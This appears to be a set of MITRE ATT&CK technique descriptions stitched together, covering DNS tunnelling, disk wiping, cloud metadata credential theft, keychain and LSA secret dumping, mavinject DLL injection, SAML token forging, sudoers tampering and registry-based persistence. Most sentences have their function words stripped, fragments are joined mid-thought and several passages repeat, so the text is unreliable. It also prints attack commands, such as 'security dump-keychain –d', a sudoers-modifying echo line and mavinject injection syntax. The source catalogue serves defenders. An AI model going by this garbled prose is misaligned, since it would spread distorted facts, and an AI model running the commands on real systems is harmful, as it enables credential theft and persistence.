By running DNS servers, adversaries control administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). control DNS server, adversaries configure DNS applications provide conditional responses malware and, generally, flexibility structure DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019) Adversaries wipe corrupt raw disk data specific systems network interrupt availability network resources. direct write access disk, adversaries attempt overwrite portions disk data. Adversaries opt wipe arbitrary portions disk data wipe disk structures master boot record (MBR). complete wipe disk sectors attempted.

To maximize impact target organization operations network-wide availability interruption goal, malware wiping disks worm-like features propagate network leveraging additional techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware) Adversaries communicate Domain (DNS) application layer protocol avoid detection/network filtering blending existing traffic. Commands remote system, commands, embedded protocol traffic client server. 

The DNS protocol serves administrative function networking common environments. DNS traffic allowed network authentication completed. DNS packets fields headers data concealed. DNS tunneling, adversaries abuse DNS communicate systems control victim network mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling)  Adversaries attempt access Cloud Instance Metadata API collect credentials sensitive data.

Most cloud service providers support Cloud Instance Metadata API service running virtual instances applications access running virtual instance. includes name, security group, additional metadata including sensitive data credentials UserData scripts additional secrets. Instance Metadata API convenience assist managing applications accessible access instance.(Citation: AWS Instance Metadata API) cloud metadata API profile compromise.(Citation: Krebs Capital August 2019)

If adversaries presence running virtual instance, query Instance Metadata API identify credentials grant access additional resources. Additionally, adversaries exploit Server-Side Request Forgery (SSRF) vulnerability public facing proxy gain access sensitive request Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

The facto standard cloud service providers host Instance Metadata API <code>http[:]//169.254.169.254</code>.
 adversary root access (allowing read securityd’s memory), scan memory correct sequence decrypt user’s logon keychain. adversary plaintext passwords users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS Keychain)(Citation: OSX Keydnap malware)

In OS prior El Capitan, users root access read plaintext keychain passwords logged-in users Apple’s keychain implementation credentials cached users repeatedly prompted passwords.(Citation: OS Keychain)(Citation: External DA, OS Way) Apple’s securityd utility takes user’s logon password, encrypts PBKDF2, stores master key memory. Apple set algorithms encrypt user’s password, master key found, adversary iterate values unlock final password.(Citation: OS Keychain) Adversaries gather Policy settings identify paths privilege escalation, security measures applied domain, discover patterns domain objects manipulated blend environment. Policy centralized management user settings Active Directory (AD). policy objects (GPOs) containers policy settings files stored predicable network path <code>\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\</code>.(Citation: TechNet Policy Basics)(Citation: ADSecurity GPO Persistence 2016)

Adversaries commands <code>gpresult</code> publicly PowerShell functions, <code>Get-DomainGPO</code> <code>Get-DomainGPOLocalGroup</code>, gather Policy settings.(Citation: gpresult)(Citation: Github PowerShell Empire) Adversaries shape follow-on behaviors, including determining potential attack paths target network opportunities manipulate Policy settings [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) benefit. Adversaries bootkits persist systems. Bootkits reside layer operating difficult perform remediation organization suspects accordingly.

A bootkit malware variant modifies boot sectors hard drive, including Master Boot Record (MBR) Volume Boot Record (VBR). (Citation: Mandiant Trends 2016) MBR disk loaded completing hardware initialization BIOS. location boot loader. adversary raw access boot drive overwrite area, diverting execution startup normal boot loader adversary code. (Citation: Lau 2011)

The MBR passes control boot process VBR. MBR, adversary raw access boot drive overwrite VBR divert execution startup adversary code. Adversaries search connected removable media computers compromised files interest. Sensitive data collected removable media (optical disk drive, USB memory, etc.) connected compromised prior Exfiltration. Interactive command shells use, common functionality [cmd](https://attack.mitre.org/software/S0106) gather information. 

Some adversaries [Automated Collection](https://attack.mitre.org/techniques/T1119) removable media. Code signing level authenticity binary developer guarantee binary tampered with. (Citation: Wikipedia Code Signing) However, adversaries code signing certificates masquerade malware tools legitimate binaries (Citation: Janicab). certificates operation created, forged, stolen adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)

Code signing verify software modern Windows macOS/OS systems. Linux decentralized nature platform. (Citation: Wikipedia Code Signing)

Code signing certificates bypass security policies require signed code execute system. Adversaries abuse mavinject.exe proxy execution malicious code. Mavinject.exe Application Virtualization Injector, Windows utility inject code external processes Application Virtualization (App-V).(Citation: LOLBAS Mavinject)

Adversaries abuse mavinject.exe inject malicious DLLs running processes [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing arbitrary code execution (ex. <code>C:\Windows\system32\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) mavinject.exe digitally signed Microsoft, proxying execution method evade detection security products execution masked legitimate process. 

In addition [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe abused perform import descriptor injection  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). command inject import table entry consisting DLL module base address.(Citation: Mavinject Functionality Deconstructed) Adversaries attempt access Cloud Instance Metadata API collect credentials sensitive data.

Most cloud service providers support Cloud Instance Metadata API service running virtual instances applications access running virtual instance. includes name, security group, additional metadata including sensitive data credentials UserData scripts additional secrets. Instance Metadata API convenience assist managing applications accessible access instance.(Citation: AWS Instance Metadata API)

If adversaries presence running virtual instance, query Instance Metadata API identify credentials grant access additional resources. Additionally, attackers exploit Server-Side Request Forgery (SSRF) vulnerability public facing proxy attacker gain access sensitive request Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)

The facto standard cloud service providers host Instance Metadata API <code>http[:]//169.254.169.254</code>.
 Process hollowing occurs process created suspended memory unmapped replaced malicious code. [Process Injection](https://attack.mitre.org/techniques/T1055), execution malicious code masked legitimate process evade defenses detection analysis. (Citation: Leitch Hollowing) (Citation: Elastic Process Injection July 2017) Adversaries stage collected data central location directory local prior Exfiltration. Data separate files combined file techniques [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells used, common functionality [cmd](https://attack.mitre.org/software/S0106) bash data staging location.

Adversaries stage collected data formats/locations system, including local storage databases/repositories Windows Registry.(Citation: Prevailion DarkWatchman 2021) Adversaries match approximate location legitimate files resources naming/placing them. sake evading defenses observation. placing executable commonly trusted directory (ex: System32) legitimate, trusted program (ex: svchost.exe). containerized environments, creating resource namespace matches naming convention container pod cluster. Alternatively, file container image close approximation legitimate programs/images innocuous.

Adversaries icon file mimic. Domain fronting takes advantage routing schemes Content Delivery Networks (CDNs) services host multiple domains obfuscate intended destination HTTPS traffic traffic tunneled HTTPS. (Citation: Fifield Blocking Resistent Communication domain fronting 2015) technique involves domain names SNI field TLS header Host field header. domains served CDN, CDN route address header unwrapping TLS header. variation technique, "domainless" fronting, utilizes SNI field left blank; fronting CDN attempts validate SNI Host fields match (if blank SNI fields ignored).

For example, domain-x domain-y customers CDN, domain-x TLS header domain-y header. Traffic domain-x, CDN route domain-y. Adversaries create self-signed SSL/TLS certificates targeting. SSL/TLS certificates designed instill trust. include key, owner's identity, digital signature entity verified certificate's contents correct. signature valid, person examining certificate trusts signer, key communicate owner. self-signing, digital certificates lack element trust signature third-party certificate authority (CA).

Adversaries create self-signed SSL/TLS certificates operations, encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) root trust [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).

After creating digital certificate, adversary install certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) infrastructure control. Adversaries insert, delete, manipulate data rest influence external outcomes hide activity, threatening integrity data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) manipulating stored data, adversaries attempt affect business process, organizational understanding, decision making.

Stored data include variety file formats, Office files, databases, stored emails, custom file formats. type modification impact depends type data goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries password cracking attempt recover usable credentials, plaintext passwords, credential material password hashes obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) password hashes, adversary [Pass Hash](https://attack.mitre.org/techniques/T1550/002) option. Further,  adversaries leverage [Data Configuration Repository](https://attack.mitre.org/techniques/T1602) hashed credentials network devices.(Citation: US-CERT-TA18-106A) 

Techniques systematically guess passwords compute hashes available, adversary pre-computed rainbow table crack hashes. Cracking hashes adversary-controlled systems target network.(Citation: Wikipedia Password cracking) plaintext password cracked hash log systems, resources, services account access. Windows security identifier (SID) unique identifies user account. SIDs Windows security security descriptors access tokens. (Citation: SID) account hold additional SIDs SID-History Active Directory attribute (Citation: SID-History Attribute), allowing inter-operable account migration domains values SID-History included access tokens).

Adversaries mechanism privilege escalation. Domain Administrator (or equivalent) rights, harvested well-known SID values (Citation: SIDs Jun 2017) inserted SID-History enable impersonation arbitrary users/groups Enterprise Administrators. manipulation result elevated access local resources access inaccessible domains lateral movement techniques [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), [Windows Remote Management](https://attack.mitre.org/techniques/T1028). Adversaries target user email local systems collect sensitive information. Files email data acquired user’s local system, Outlook storage cache files.

Outlook stores data locally offline data files extension .ost. Outlook 2010 supports .ost file sizes 50GB, earlier versions Outlook support 20GB.(Citation: Outlook File Sizes) IMAP accounts Outlook 2013 (and earlier) POP accounts Outlook Data Files (.pst) opposed .ost, IMAP accounts Outlook 2016 (and later) .ost files. types Outlook data files typically stored `C:\Users\<username>\Documents\Outlook Files` `C:\Users\<username>\AppData\Local\Microsoft\Outlook`.(Citation: Outlook Files) Adversaries acquire credentials Keychain. Keychain (or Keychain Services) macOS credential management stores account names, passwords, private keys, certificates, sensitive application data, payment data, secure notes. types Keychains: Login Keychain, Keychain, Local Items (iCloud) Keychain. default Keychain Login Keychain, stores user passwords information. Keychain stores items accessed operating system, items shared users host. Local Items (iCloud) Keychain items synced Apple’s iCloud service. 

Keychains viewed edited Keychain Access application command-line utility <code>security</code>. Keychain files located <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)

Adversaries gather user credentials Keychain storage/memory. example, command <code>security dump-keychain –d</code> dump Login Keychain credentials <code>~/Library/Keychains/login.keychain-db</code>. Adversaries read Login Keychain credentials <code>~/Library/Keychains/login.keychain</code> file. methods require password, default password Login Keychain current user’s password login macOS host.(Citation: External DA, OS Way)(Citation: Empire Keychain Decrypt)   Adversaries configure settings automatically execute program boot logon maintain persistence gain higher-level privileges compromised systems. Operating systems mechanisms automatically running program boot account logon.(Citation: Key)(Citation: MSDN Authentication Packages)(Citation: TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) mechanisms include automatically executing programs specially designated directories referenced repositories store configuration information, Windows Registry. adversary achieve goal modifying extending features kernel.

Since boot logon autostart programs privileges, adversary leverage elevate privileges. Adversaries access host attempt access Local Security Authority (LSA) secrets, variety credential materials, credentials service accounts.(Citation: Passcape LSA Secrets)(Citation: Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets stored registry <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets dumped memory.(Citation: ired Dumping LSA Secrets)

[Reg](https://attack.mitre.org/software/S0075) extract Registry. [Mimikatz](https://attack.mitre.org/software/S0002) extract secrets memory.(Citation: ired Dumping LSA Secrets) port monitor set  (Citation: AddMonitor) API set DLL loaded startup. (Citation: AddMonitor) DLL located <code>C:\Windows\System32</code> loaded print spooler service, spoolsv.exe, boot. spoolsv.exe process runs level permissions. (Citation: Bloxham) Alternatively, arbitrary DLL loaded permissions writing fully-qualified pathname DLL <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. 

The Registry key entries following:

* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port

Adversaries technique load malicious code startup persist reboot execute SYSTEM. Adversaries compromise network device’s encryption capability bypass encryption protect data communications. (Citation: Cisco Synful Knock Evolution)

Encryption protect transmitted network traffic maintain confidentiality (protect unauthorized disclosure) integrity (protect unauthorized changes). Encryption ciphers convert plaintext message ciphertext computationally intensive decipher decryption key. Typically, increase cost cryptanalysis, decryption key.

Adversaries compromise manipulate devices perform encryption network traffic. example, behaviors [Modify Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), adversary negatively eliminate device’s ability securely encrypt network traffic. poses risk unauthorized disclosure facilitate data manipulation, Credential Access, Collection efforts. (Citation: Cisco Blog Legacy Device Attacks) adversary forge SAML tokens permissions claims lifetimes possess valid SAML token-signing certificate.(Citation: SolarWinds Steps) default lifetime SAML token hour, validity period <code>NotOnOrAfter</code> <code>conditions ...</code> element token. changed <code>AccessTokenLifetime</code> <code>LifetimeTokenPolicy</code>.(Citation: SAML Token Lifetimes) Forged SAML tokens enable adversaries authenticate services SAML 2.0 SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)

An adversary utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) compromise organization's token-signing certificate create forged SAML tokens. adversary sufficient permissions establish federation trust Active Directory Federation Services (AD FS) server, generate trusted token-signing certificate.(Citation: SolarWinds Customer Guidance) differs [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) behaviors tokens forged adversary, stolen intercepted legitimate users.

An adversary gain administrative Azure privileges SAML token forged claims represent highly privileged account. lead [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), bypass multi-factor authentication protection mechanisms.(Citation: SolarWinds Customer Guidance) Spearphishing link specific variant spearphishing. forms spearphishing employs links download malware contained email, attaching malicious files email itself, avoid defenses inspect email attachments. 

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. case, malicious emails links. Generally, links accompanied social engineering require user actively paste URL browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). visited compromise browser exploit, user prompted download applications, documents, zip files, executables depending pretext email place. Adversaries include links intended interact email reader, including embedded images intended exploit verify receipt email bugs/web beacons). Links direct users malicious applications  designed [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, OAuth tokens, gain access protected applications information.(Citation: Trend Micro Pawn Storm OAuth 2017) Adversaries disable services render services unavailable legitimate users. Stopping critical services processes inhibit response incident aid adversary's objectives damage environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) 

Adversaries accomplish disabling individual services organization, <code>MSExchangeIS</code>, Exchange content inaccessible (Citation: Novetta Blockbuster). cases, adversaries disable services render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services processes modification data stores running. Adversaries services processes conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) [Data Encrypted Impact](https://attack.mitre.org/techniques/T1486) data stores services Exchange SQL Server.(Citation: SecureWorks WannaCry Analysis) Adversaries develop malware malware components targeting. Building malicious software include development payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, creation infected removable media. Adversaries develop malware support operations, creating maintaining control remote machines, evading defenses, executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)

As legitimate development efforts, skill sets required developing malware. skills located in-house, contracted out. contractor considered extension adversary's malware development capabilities, adversary plays role shaping requirements maintains degree exclusivity malware.

Some aspects malware development, C2 protocol development, require adversaries additional infrastructure. example, malware developed communicate Twitter C2, require [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29) Regsvcs Regasm Windows command-line utilities register .NET Component Object Model (COM) assemblies. digitally signed Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

Adversaries Regsvcs Regasm proxy execution code trusted Windows utility. utilities bypass process whitelisting attributes binary code registration unregistration: <code>[ComRegisterFunction]</code> <code>[ComUnregisterFunction]</code> respectively. code registration unregistration attributes executed process insufficient privileges fails execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm) <code>sudo</code> command "allows administrator delegate authority users (or users) ability (or all) commands root user providing audit trail commands arguments." (Citation: sudo 2018) sudo administrator, configuration features <code>timestamp_timeout</code> time minutes instances <code>sudo</code> re-prompt password. <code>sudo</code> ability cache credentials period time. Sudo creates (or touches) file <code>/var/db/sudo</code> timestamp sudo determine timeout. Additionally, <code>tty_tickets</code> variable treats tty (terminal session) isolation. that, example, sudo timeout tty affect tty (you type password again).

Adversaries abuse poor configurations escalate privileges user's password. <code>/var/db/sudo</code>'s timestamp monitored falls <code>timestamp_timeout</code> range. does, malware execute sudo commands supply user's password. <code>tty_tickets</code> disabled, adversaries tty user. 

The OSX Proton Malware disabled <code>tty_tickets</code> scripting easier issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>  (Citation: cybereason osx proton). change reflected, Proton malware issue <code>killall Terminal</code>. macOS Sierra, sudoers file <code>tty_tickets</code> enabled default. Adversaries attempt listing domain accounts. adversaries determine domain accounts exist aid follow-on behavior.

Commands <code>net user /domain</code> <code>net /domain</code> [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, <code>ldapsearch</code> Linux list domain users groups. Adversaries achieve persistence adding Registry key Active Setup local machine. Active Setup Windows mechanism execute programs user logs in. stored Registry key executed user logs computer.(Citation: Klein Active Setup 2010) programs executed context user account's permissions level.

Adversaries abuse Active Setup creating key <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> setting malicious <code>StubPath</code>. serve program executed user logs computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)

Adversaries abuse components execute malware, remote access tools, maintain persistence reboots. Adversaries [Masquerading](https://attack.mitre.org/techniques/T1036) Registry entries legitimate programs. Adversaries attempt hide artifacts behaviors evade detection. Operating systems features hide artifacts, files administrative task execution, avoid disrupting user environments prevent users changing files features system. Adversaries abuse features hide artifacts files, directories, user accounts, activity evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)

Adversaries attempt hide artifacts malicious behavior creating computing regions isolated common security instrumentation, virtualization technology.(Citation: Sophos Ragnar 2020) Adversaries Windows Dynamic Data Exchange (DDE) execute arbitrary commands. DDE client-server protocol one-time continuous inter-process communication (IPC) applications. link established, applications autonomously exchange transactions consisting strings, warm data links (notifications data item changes), hot data links (duplications data item), requests command execution.

Object Linking Embedding (OLE), ability link data documents, originally implemented DDE. superseded [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE enabled Windows Office 2016 Registry keys.(Citation: BleepingComputer DDE Disabled Word Dec 2017)(Citation: ADV170021 Dec 2017)(Citation: DDE Advisory Nov 2017)

Microsoft Office documents poisoned DDE commands, embedded files, deliver execution [Phishing](https://attack.mitre.org/techniques/T1566) campaigns hosted content, avoiding Visual Basic Applications (VBA) macros.(Citation: SensePost PS DDE 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries infect payloads execute applications commands victim device embedding DDE formulas CSV file intended Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

DDE leveraged adversary operating compromised machine direct access [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution invoked remotely [Remote Services](https://attack.mitre.org/techniques/T1021) [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting June 2019) adversary rely user malicious file gain execution. Users subjected social engineering file lead code execution. user action typically observed follow-on behavior [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries types files require user execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl.

Adversaries employ forms [Masquerading](https://attack.mitre.org/techniques/T1036) [Obfuscated Files Information](https://attack.mitre.org/techniques/T1027) increase likelihood user execute malicious file. methods include familiar naming convention password protecting file supplying instructions user it.(Citation: Password Protected Word Docs) 

While [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly Initial Access occur phases intrusion, adversary file shared directory user's desktop hoping user it. activity shortly [Internal Spearphishing](https://attack.mitre.org/techniques/T1534). Adversaries gather victim's business tempo targeting. organization’s business tempo include variety details, including operational hours/days week. reveal times/dates purchases shipments victim’s hardware software resources.

Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). business tempo exposed adversaries online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering reveal opportunities forms reconnaissance (ex: [Phishing Information](https://attack.mitre.org/techniques/T1598) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) [Trusted Relationship](https://attack.mitre.org/techniques/T1199)) Adversaries attempt listing security software, configurations, defensive tools, sensors installed system. include local firewall rules anti-virus. Adversaries [Security Software Discovery](https://attack.mitre.org/techniques/T1063) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.


### Windows

Example commands security software [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> [cmd](https://attack.mitre.org/software/S0106), [Tasklist](https://attack.mitre.org/software/S0057), indicators discovery behavior specific type software security adversary for.

### Mac

It's common macOS malware perform checks LittleSnitch KnockKnock software. Adversaries gather victim's host hardware targeting. hardware infrastructure include variety details types versions specific hosts, presence additional components indicative defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) [Phishing Information](https://attack.mitre.org/techniques/T1598). Adversaries compromise sites include malicious content designed collect host visitors.(Citation: ATT ScanBox) hardware infrastructure exposed adversaries online accessible data sets (ex: job postings, network maps, assessment reports, resumes, purchase invoices). Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) [Hardware Additions](https://attack.mitre.org/techniques/T1200)). 
Adversaries deliver payloads remote systems adding content shared storage locations, network drives internal code repositories. Content stored network drives shared locations tainted adding malicious programs, scripts, exploit code valid files. user shared tainted content, malicious portion executed adversary's code remote system. Adversaries tainted shared content laterally.

A directory share pivot variation technique techniques propagate malware users access shared network directory. [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) directory .LNK files [Masquerading](https://attack.mitre.org/techniques/T1036) real directories, hidden [Hidden Files Directories](https://attack.mitre.org/techniques/T1564/001). malicious .LNK-based directories embedded command executes hidden malware file directory real intended directory user's expected action occurs. frequently network directories, technique result frequent reinfections broad access systems privileged accounts. (Citation: Retwin Directory Share Pivot)

Adversaries compromise shared network directories binary infections appending prepending code healthy binary shared network directory. malware modify original entry (OEP) healthy binary ensure executed legitimate code. infection continue spread newly infected file executed remote system. infections target binary non-binary formats extensions including, limited to, .EXE, .DLL, .SCR, .BAT, .VBS. Adversaries add domain trusts modify properties existing domain trusts evade defenses elevate privileges. Domain trust details, domain federated, authentication authorization properties apply domains purpose accessing shared resources.(Citation: - Azure Federation) trust objects include accounts, credentials, authentication material applied servers, tokens, domains.

Manipulating domain trusts adversary escalate privileges evade defenses modifying settings add objects control. example, forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002), compromise signing certificate forge credentials. Instead, adversary manipulate domain trusts add signing certificate. adversary convert domain federated domain, enable malicious trust modifications altering claim issuance rules log valid set credentials user.(Citation: AADInternals zure Federated Domain)  Adversaries employ symmetric encryption algorithm conceal command control traffic relying inherent protections communication protocol. Symmetric encryption algorithms key plaintext encryption ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, RC4. Adversaries attempt listing local accounts. adversaries determine local accounts exist aid follow-on behavior.

Commands <code>net user</code> <code>net localgroup</code> [Net](https://attack.mitre.org/software/S0039) utility <code>id</code> <code>groups</code>on macOS Linux list local users groups. Linux, local users enumerated <code>/etc/passwd</code> file. macOS <code>dscl . list /Users</code> command enumerate local accounts. OS prior El Capitan, users root access read plaintext keychain passwords logged-in users Apple’s keychain implementation credentials cached users repeatedly prompted passwords. (Citation: OS Keychain) (Citation: External DA, OS Way) Apple’s securityd utility takes user’s logon password, encrypts PBKDF2, stores master key memory. Apple set algorithms encrypt user’s password, master key found, attacker iterate values unlock final password. (Citation: OS Keychain)

If adversary root access (allowing read securityd’s memory), scan memory correct sequence decrypt user’s logon keychain. adversary plaintext passwords users, WiFi, mail, browsers, certificates, secure notes, etc. (Citation: OS Keychain) (Citation: OSX Keydnap malware) Adversaries compromise social media accounts targeting. operations incorporating social engineering, utilization online persona important. creating cultivating social media profiles [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001)), adversaries compromise existing social media accounts. Utilizing existing persona engender level trust potential victim relationship, knowledge of, compromised persona. 

A variety methods exist compromising social media accounts, gathering credentials [Phishing Information](https://attack.mitre.org/techniques/T1598), purchasing credentials third-party sites, brute forcing credentials (ex: password reuse breach credential dumps).(Citation: AnonHBGary) Prior compromising social media accounts, adversaries conduct Reconnaissance inform decisions accounts compromise operation.

Personas exist single multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts require additional development, include filling modifying profile information, developing social networks, incorporating photos.

Adversaries compromised social media profile create new, hijack existing, connections targets interest. connections direct include connect others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) Compromised profiles leveraged phases adversary lifecycle, Initial Access (ex: [Spearphishing Service](https://attack.mitre.org/techniques/T1566/003)). Adversaries application access tokens bypass typical authentication process access restricted accounts, information, services remote systems. tokens typically stolen users lieu login credentials.

Application access tokens authorized API requests behalf user commonly access resources cloud-based applications software-as-a-service (SaaS).(Citation: Auth0 - Access Tokens Secure APIs Sept 2019) OAuth commonly implemented framework issues tokens users access systems. frameworks collaboratively verify user determine actions user allowed perform. identity established, token actions authorized, passing actual credentials user. Therefore, compromise token grant adversary access resources sites malicious application.(Citation: okta)

For example, cloud-based email service OAuth access token granted malicious application, gain long-term access features user account "refresh" token enabling background access awarded.(Citation: Identity Platform Access 2019) OAuth access token adversary user-granted REST API perform functions email searching contact enumeration.(Citation: Staaldraad Phishing OAuth 2017)

Compromised access tokens initial step compromising services. example, token grants access victim’s primary email, adversary extend access services target subscribes triggering forgotten password routines. Direct API access token negates effectiveness authentication factor immune intuitive countermeasures changing passwords. Access abuse API channel difficult detect service provider end, access align legitimate workflow.
 Adversaries abuse Windows safe mode disable endpoint defenses. Safe mode starts Windows operating limited set drivers services. Third-party security software endpoint detection response (EDR) tools start booting Windows safe mode. versions safe mode: Safe Mode Safe Mode Networking. start additional services safe mode boot.(Citation: Safe Mode)(Citation: Sophos Snatch Ransomware 2019)

Adversaries abuse safe mode disable endpoint defenses start limited boot. Hosts forced safe mode reboot modifications Boot Configuration Data (BCD) stores, files manage boot application settings.(Citation: bcdedit 2021)

Adversaries add malicious applications list minimal services start safe mode modifying relevant Registry values [Modify Registry](https://attack.mitre.org/techniques/T1112)). Malicious [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) objects registered loaded safe mode.(Citation: Sophos Snatch Ransomware 2019)(Citation: CyberArk Labs Safe Mode 2016)(Citation: Cybereason Nocturnus MedusaLocker 2020)(Citation: BleepingComputer REvil 2021) Screensavers programs execute configurable time user inactivity consist Portable Executable (PE) files .scr file extension.(Citation: Wikipedia Screensaver) Windows screensaver application scrnsave.scr located <code>C:\Windows\System32\</code>, <code>C:\Windows\sysWOW64\</code> 64-bit Windows systems, screensavers included base Windows installations. 

The screensaver settings stored Registry (<code>HKCU\Control Panel\Desktop\</code>) manipulated achieve persistence:

* <code>SCRNSAVE.exe</code> - set malicious path
* <code>ScreenSaveActive</code> - set '1' enable screensaver
* <code>ScreenSaverIsSecure</code> - set '0' require password unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout screensaver executed

Adversaries screensaver settings maintain persistence setting screensaver malware timeframe user inactivity. (Citation: ESET Gazer Aug 2017) Adversaries abuse netbooting load unauthorized network device operating Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) commonly network administrators load configuration-controlled network device images centralized management server. Netbooting option boot sequence centralize, manage, control device images.

Adversaries manipulate configuration network device malicious TFTP server, conjunction [Modify Image](https://attack.mitre.org/techniques/T1601) load modified image device startup reset. unauthorized image adversaries modify device configuration, add malicious capabilities device, introduce backdoors maintain control network device minimizing detection standard functionality. technique [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) result network device running modified image. (Citation: Cisco Blog Legacy Device Attacks) Adversaries create modify Windows services repeatedly execute malicious payloads persistence. Windows boots up, starts programs applications called services perform background functions.(Citation: TechNet Services) Windows service configuration information, including file path service's executable recovery programs/commands, stored Windows Registry.

Adversaries install service modify existing service execute startup persist system. Service configurations set modified utilities (such sc.exe), modifying Registry, interacting Windows API. 

